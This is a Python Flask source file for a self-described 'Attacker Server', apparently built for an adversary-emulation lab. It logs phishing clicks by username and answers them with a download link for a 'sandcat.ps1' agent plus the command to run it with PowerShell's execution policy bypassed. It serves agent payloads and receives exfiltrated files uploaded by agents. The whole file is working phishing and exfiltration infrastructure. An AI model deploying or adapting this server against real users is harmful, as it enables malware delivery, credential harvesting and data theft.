from flask import Flask, request, jsonify, send_file
import os, datetime
from werkzeug.utils import secure_filename
import hashlib

app = Flask(__name__)

BASE_DIR = "/home/swlab/ttps4_attack_server"
AGENT_DIR = os.path.join(BASE_DIR, "agents")
LOG_FILE = os.path.join(BASE_DIR, "logs/access.log")
UPLOAD_DIR = os.path.join(BASE_DIR, "uploads")

os.makedirs(UPLOAD_DIR, exist_ok=True)
os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)

def log_event(text):
    with open(LOG_FILE, "a") as f:
        f.write(f"[{datetime.datetime.now()}] {text}\n")

def sha256sum(data: bytes):
    h = hashlib.sha256()
    h.update(data)
    return h.hexdigest()

@app.route("/")
def home():
    return "Attacker Server Running"


@app.route("/login", methods=["GET", "POST"])
def login_trigger():
    if request.method == "POST":
        user = request.form.get("user")
    else:
        user = request.args.get("user")

    log_event(f"Phishing click. user={user}")

    return jsonify({
        "status": "ok",
        "file_name": "sandcat.ps1",
        "download_url": "http://192.168.56.1:34444/agents/sandcat.ps1",
        "execute": "powershell -ExecutionPolicy Bypass -File sandcat.ps1"
    })

@app.route("/agents/<path:filename>")
def serve_agent(filename):
    file_path = os.path.join(AGENT_DIR, filename)
    if not os.path.exists(file_path):
        log_event(f"FILE NOT FOUND: {file_path}")
        return "File not found", 404
    
    log_event(f"Agent download: {filename}")
    return send_file(file_path, as_attachment=True)

@app.route("/upload", methods=["POST"])
def upload_file():
    ts       = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    agent_id = request.form.get("agent_id", "unknown")
    note     = request.form.get("note", "")

    # =========================================================
    # CASE 1: multipart/form-data (PowerShell -Form 방식)
    # =========================================================
    if "file" in request.files:
        f = request.files["file"]
        if f.filename == "":
            return "Empty filename", 400

        original = secure_filename(f.filename)
        data = f.read()

        sha = sha256sum(data)
        save_name = f"{ts}_{agent_id}_{original}"
        save_path = os.path.join(UPLOAD_DIR, save_name)

        with open(save_path, "wb") as out:
            out.write(data)

        log_event(
            f"[MULTIPART] agent={agent_id} file={save_name} "
            f"sha256={sha} note={note}"
        )

        return jsonify({
            "status": "ok",
            "mode": "multipart",
            "saved_as": save_name,
            "sha256": sha
        })

    # =========================================================
    # CASE 2: raw binary upload (PowerShell -InFile 방식)
    # =========================================================
    raw = request.get_data()
    if raw and len(raw) > 0:
        sha = sha256sum(raw)
        save_name = f"{ts}_{agent_id}_raw_upload.bin"
        save_path = os.path.join(UPLOAD_DIR, save_name)

        with open(save_path, "wb") as out:
            out.write(raw)

        log_event(
            f"[RAW] agent={agent_id} file={save_name} "
            f"sha256={sha} note={note}"
        )

        return jsonify({
            "status": "ok",
            "mode": "raw",
            "saved_as": save_name,
            "sha256": sha
        })

    # =========================================================
    # FAIL
    # =========================================================
    log_event("[UPLOAD FAIL] No file received")
    return "No file received", 400


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=34444)
